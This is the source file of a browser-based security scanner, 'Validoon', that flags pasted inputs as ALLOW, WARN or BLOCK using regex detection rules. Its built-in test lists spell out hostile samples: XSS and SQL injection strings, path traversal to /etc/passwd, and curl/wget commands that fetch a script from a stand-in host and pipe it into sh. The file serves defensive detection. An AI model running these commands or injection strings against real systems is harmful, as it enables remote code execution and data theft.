// app.js
(() => {
  "use strict";

  const BUILD = "v2026-01-03_final_mvp_freeze_unified_B";
  const nowISO = () => new Date().toISOString();

  function $(id) { return document.getElementById(id); }

  function on(el, evt, fn) {
    if (!el) return;
    el.addEventListener(evt, fn);
  }

  function shannonEntropy(str) {
    if (!str) return 0;
    const freq = new Map();
    for (const ch of str) freq.set(ch, (freq.get(ch) || 0) + 1);
    const len = str.length;
    let ent = 0;
    for (const [, c] of freq) {
      const p = c / len;
      ent -= p * Math.log2(p);
    }
    return Math.round(ent * 100) / 100;
  }

  function looksLikeURL(s) {
    return /^https?:\/\//i.test(s) || /^[a-z0-9.-]+\.[a-z]{2,}(\/|$)/i.test(s);
  }

  function classifyType(s) {
    const x = (s || "").trim();
    if (!x) return "Data";
    const isURL = looksLikeURL(x) || /(^|[?&])(url|next|returnurl|redirect_uri)=/i.test(x);
    const isExploit =
      /<script|onerror=|onload=|javascript:|data:text\/html|(\.\.\/){2,}|\\windows\\system32|union\s+select|1=1|--\s*$|wget\s+http|curl\s+-s|powershell\s+-enc/i.test(x);
    if (isExploit) return "Exploit";
    if (isURL) return "URL";
    return "Data";
  }

  // Signal rules
  const RULES = [
    {
      label: "REDIRECT_PARAM",
      test: s => /(^|[?&])(redirect_uri|redirect|returnurl|returnUrl|next|url)=/i.test(s) || /\b(returnUrl|next)=\/\/[^ \n]+/i.test(s),
      sev: 55, conf: 90
    },
    {
      label: "AUTH_ENDPOINT",
      test: s => /(oauth\/authorize|oauth2\/authorize|\/signin\/oauth|login\.microsoftonline\.com\/common\/oauth2\/authorize)/i.test(s),
      sev: 45, conf: 80
    },
    {
      label: "BASE64_DECODE",
      test: s => /(data:text\/html;base64,|eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,})/i.test(s),
      sev: 35, conf: 70
    },
    {
      label: "OBFUSCATION",
      test: s => /%2f|%3a|%3d|%5c|\\x[0-9a-f]{2}|\\u[0-9a-f]{4}|[A-Za-z0-9+\/]{30,}={0,2}/i.test(s),
      sev: 35, conf: 67
    },
    {
      label: "HOMOGRAPH_RISK",
      test: s => /\bxn--/i.test(s),
      sev: 60, conf: 70
    },
    {
      label: "XSS/JS_SCRIPT",
      test: s => /<script|onerror=|onload=|javascript:|data:text\/html|<img[^>]+onerror=|<svg[^>]+onload=/i.test(s),
      sev: 85, conf: 85
    },
    {
      label: "LFI:ETC_PASSWD",
      test: s => /(\.\.\/){2,}etc\/passwd|etc\/passwd|windows\\system32\\drivers\\etc\\hosts/i.test(s),
      sev: 80, conf: 75
    },
    {
      label: "CMD:CMD_CHAIN",
      test: s => /(&&|\|\|)\s*\w+|;\s*\w+|\|\s*\w+|powershell\s+-enc/i.test(s),
      sev: 85, conf: 85
    },
    {
      label: "DOWNLOAD_TOOL",
      test: s => /\b(wget|curl)\b.*\b(http|https):\/\/.*(\|\s*(sh|bash)|-O-|\|\s*sh)/i.test(s),
      sev: 90, conf: 90
    },
    {
      label: "SQL:SQLI_TAUTOLOGY",
      test: s => /(1\s*=\s*1(\s*or\s*1\s*=\s*1)?|'\s*or\s*'1'\s*=\s*'1|admin'\s*--|select\s+\*\s+from\s+\w+\s+where)/i.test(s),
      sev: 75, conf: 85
    },
    {
      label: "SQL:SQLI_UNION_ALL",
      test: s => /union\s+select/i.test(s),
      sev: 80, conf: 80
    }
  ];

  function analyzeOne(input) {
    const s = (input || "").trim();
    const hits = [];

    for (const r of RULES) {
      if (r.test(s)) hits.push({ label: r.label, sev: r.sev, conf: r.conf });
    }

    let severity = 0, confidence = 0;
    if (hits.length) {
      severity = Math.max(...hits.map(h => h.sev));
      confidence = Math.max(...hits.map(h => h.conf));
    }

    let decision = "ALLOW";
    if (hits.some(h => h.sev >= 85) || hits.some(h => h.label === "DOWNLOAD_TOOL")) decision = "BLOCK";
    else if (hits.some(h => h.sev >= 55)) decision = "WARN";

    const type = classifyType(s);
    const entropy = shannonEntropy(s);

    return { input: s, type, decision, severity, confidence, entropy, hits };
  }

  function verdictFrom(rows) {
    const counts = { scans: rows.length, allow: 0, warn: 0, block: 0 };
    for (const r of rows) {
      if (r.decision === "ALLOW") counts.allow++;
      else if (r.decision === "WARN") counts.warn++;
      else counts.block++;
    }

    const peakSeverity = rows.length ? Math.max(...rows.map(r => r.severity)) : 0;
    const confidence = rows.length ? Math.max(...rows.map(r => r.confidence)) : 0;

    let verdict = "SECURE";
    if (counts.block > 0) verdict = "DANGER";
    else if (counts.warn > 0) verdict = "SUSPICIOUS";

    const sigMap = new Map();
    for (const r of rows) {
      for (const h of r.hits) sigMap.set(h.label, (sigMap.get(h.label) || 0) + 1);
    }
    const signals = [...sigMap.entries()]
      .sort((a, b) => b[1] - a[1])
      .map(([label, count]) => ({ label, count }));

    return { verdict, peakSeverity, confidence, counts, signals };
  }

  function buildReport(rows) {
    const meta = verdictFrom(rows);
    return {
      generatedAt: nowISO(),
      verdict: meta.verdict,
      peakSeverity: meta.peakSeverity,
      confidence: meta.confidence,
      counts: meta.counts,
      signals: meta.signals,
      rows
    };
  }

  function setVerdictClass(verdict) {
    const box = $("verdictBox");
    if (!box) return;
    box.classList.remove("verdict-secure", "verdict-suspicious", "verdict-danger");
    if (verdict === "DANGER") box.classList.add("verdict-danger");
    else if (verdict === "SUSPICIOUS") box.classList.add("verdict-suspicious");
    else box.classList.add("verdict-secure");
  }

  function setVerdictUI(meta) {
    const verdictText = $("verdictText");
    if (verdictText) verdictText.textContent = meta.verdict;
    setVerdictClass(meta.verdict);

    const sevEl = $("peakSev");
    const confEl = $("peakConf");
    if (sevEl) sevEl.textContent = `${meta.peakSeverity}%`;
    if (confEl) confEl.textContent = `${meta.confidence}%`;

    if ($("kScans")) $("kScans").textContent = String(meta.counts.scans);
    if ($("kAllow")) $("kAllow").textContent = String(meta.counts.allow);
    if ($("kWarn")) $("kWarn").textContent = String(meta.counts.warn);
    if ($("kBlock")) $("kBlock").textContent = String(meta.counts.block);

    const reco = $("reco");
    if (reco) {
      if (meta.verdict === "DANGER") {
        reco.textContent = "Remediation: Block these inputs. Do NOT open. Verify domain ownership. Escalate with JSON report.";
      } else if (meta.verdict === "SUSPICIOUS") {
        reco.textContent = "Remediation: Review suspicious entries. Verify domains. Sanitize/encode. Escalate if needed.";
      } else {
        reco.textContent = "No high-severity patterns detected.";
      }
    }

    const sigWrap = $("signals");
    if (sigWrap) {
      sigWrap.innerHTML = "";
      if (!meta.signals.length) {
        const d = document.createElement("div");
        d.className = "chip";
        d.textContent = "No active signals";
        sigWrap.appendChild(d);
      } else {
        for (const s of meta.signals) {
          const d = document.createElement("div");
          d.className = "chip";
          if (meta.verdict === "DANGER") d.classList.add("bad");
          else if (meta.verdict === "SUSPICIOUS") d.classList.add("warn");
          else d.classList.add("ok");
          d.textContent = `${s.label} ×${s.count}`;
          sigWrap.appendChild(d);
        }
      }
    }
  }

  function renderRows(rows) {
    const body = $("rowsBody");
    if (!body) return;
    body.innerHTML = "";

    if (!rows.length) {
      const tr = document.createElement("tr");
      tr.className = "empty";
      const td = document.createElement("td");
      td.colSpan = 6;
      td.textContent = "No results yet.";
      tr.appendChild(td);
      body.appendChild(tr);
      return;
    }

    for (const r of rows) {
      const tr = document.createElement("tr");

      const td1 = document.createElement("td");
      td1.className = "mono";
      td1.textContent = r.input.length > 180 ? r.input.slice(0, 180) + "…" : r.input;

      const td2 = document.createElement("td");
      td2.textContent = r.type;

      const td3 = document.createElement("td");
      const badge = document.createElement("span");
      badge.className = "badge " + (r.decision === "ALLOW" ? "ok" : (r.decision === "WARN" ? "warn" : "bad"));
      badge.textContent = r.decision;
      td3.appendChild(badge);

      const td4 = document.createElement("td");
      td4.textContent = `${r.severity}%`;

      const td5 = document.createElement("td");
      td5.textContent = `${r.confidence}%`;

      const td6 = document.createElement("td");
      td6.textContent = String(r.entropy);

      tr.append(td1, td2, td3, td4, td5, td6);
      body.appendChild(tr);
    }
  }

  function parseInputLines(txt) {
    return (txt || "")
      .split(/\r?\n/)
      .map(s => s.trim())
      .filter(Boolean);
  }

  const TEST_A = [
    "hello world",
    "https://example.com/",
    "https://accounts.google.com/signin/oauth/authorize?redirect_uri=https://evil.com",
    "https://login.microsoftonline.com/common/oauth2/authorize?redirect_uri=https://evl1.com",
    "http://xn--pple-43d.com/login",
    "http://paypaI.com/security",
    "http://micros0ft.com/account/verify",
    "https://good.com/redirect?url=https://evil.com",
    "https://good.com/redirect?next=https%3A%2F%2Fevil.com",
    "redirect_uri=https://evil.com",
    "returnUrl=//evil.com",
    "next=//evil.com",
    "url=javascript:alert(1)",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "; ls -la",
    "| whoami",
    "&& curl http://evl1.tld/payload.sh | sh",
    "powershell -enc SQBFAFgA",
    "SELECT * FROM users WHERE 1=1 OR 1=1",
    "' OR '1'='1",
    "admin'--",
    "UNION SELECT username,password FROM users",
    "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.payload\"}",
    "Authorization: Bearer abc.def.ghi",
    "AKIAIOSFODNN7EXAMPLE",
    "-----BEGIN PRIVATE KEY-----",
    "MIIEvQIBADANBgkqhkiG9w0BAQEFAASC...",
    "-----END PRIVATE KEY-----",
    "{\"op\":\"add\",\"path\":\"/admin\",\"value\":true}",
    "wget http://evl1.tld/a.sh -O- | sh",
    "curl -s http://evl1.tld/a | bash",
    "<script src=https://static.cloudflareinsights.com/beacon.min.js></script>"
  ];

  const TEST_B = [
    "hello world",
    "https://example.com/",
    "https://good.com/redirect?next=https%3A%2F%2Fevil.com",
    "returnUrl=//evil.com",
    "url=javascript:alert(1)",
    "<img src=x onerror=alert(1)>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "../../../../etc/passwd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "&& curl http://evl1.tld/payload.sh | sh",
    "UNION SELECT username,password FROM users",
    "powershell -enc SQBFAFgA"
  ];

  let lastReport = null;

  function runScanFromTextarea() {
    const inputEl = $("input");
    if (!inputEl) return;

    const lines = parseInputLines(inputEl.value);
    const rows = lines.map(analyzeOne);
    const report = buildReport(rows);
    lastReport = report;

    setVerdictUI({
      verdict: report.verdict,
      peakSeverity: report.peakSeverity,
      confidence: report.confidence,
      counts: report.counts,
      signals: report.signals
    });

    renderRows(report.rows);
  }

  function exportJSON() {
    if (!lastReport) runScanFromTextarea();
    if (!lastReport) return;

    const blob = new Blob([JSON.stringify(lastReport, null, 2)], { type: "application/json" });
    const a = document.createElement("a");
    const ts = new Date().toISOString().replace(/[:.]/g, "-");
    a.download = `validoon_report_${ts}.json`;
    a.href = URL.createObjectURL(blob);
    document.body.appendChild(a);
    a.click();
    setTimeout(() => {
      URL.revokeObjectURL(a.href);
      a.remove();
    }, 0);
  }

  function clearAll() {
    const inputEl = $("input");
    if (inputEl) inputEl.value = "";
    lastReport = null;

    setVerdictUI({
      verdict: "SECURE",
      peakSeverity: 0,
      confidence: 0,
      counts: { scans: 0, allow: 0, warn: 0, block: 0 },
      signals: []
    });

    renderRows([]);
  }

  function loadTest(lines) {
    const inputEl = $("input");
    if (!inputEl) return;
    inputEl.value = lines.join("\n");
    runScanFromTextarea();
  }

  function openInfo() {
    const dlg = $("infoDlg");
    if (!dlg) return;
    dlg.classList.remove("hidden");
    dlg.setAttribute("aria-hidden", "false");
  }

  function closeInfo() {
    const dlg = $("infoDlg");
    if (!dlg) return;
    dlg.classList.add("hidden");
    dlg.setAttribute("aria-hidden", "true");
  }

  function boot() {
    const stamp = $("buildStamp");
    if (stamp) stamp.textContent = `Build: ${BUILD}`;

    setVerdictUI({
      verdict: "SECURE",
      peakSeverity: 0,
      confidence: 0,
      counts: { scans: 0, allow: 0, warn: 0, block: 0 },
      signals: []
    });
    renderRows([]);

    on($("btnLoadA"), "click", () => loadTest(TEST_A));
    on($("btnLoadB"), "click", () => loadTest(TEST_B));
    on($("btnScan"), "click", runScanFromTextarea);
    on($("btnExport"), "click", exportJSON);
    on($("btnClear"), "click", clearAll);
    on($("btnInfo"), "click", openInfo);
    on($("btnCloseInfo"), "click", closeInfo);

    // Close modal on backdrop click
    const dlg = $("infoDlg");
    if (dlg) {
      on(dlg, "click", (e) => {
        if (e.target === dlg) closeInfo();
      });
    }

    console.log(`[Validoon] ${BUILD} loaded. Local-only. No network.`);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", boot);
  } else {
    boot();
  }
})();
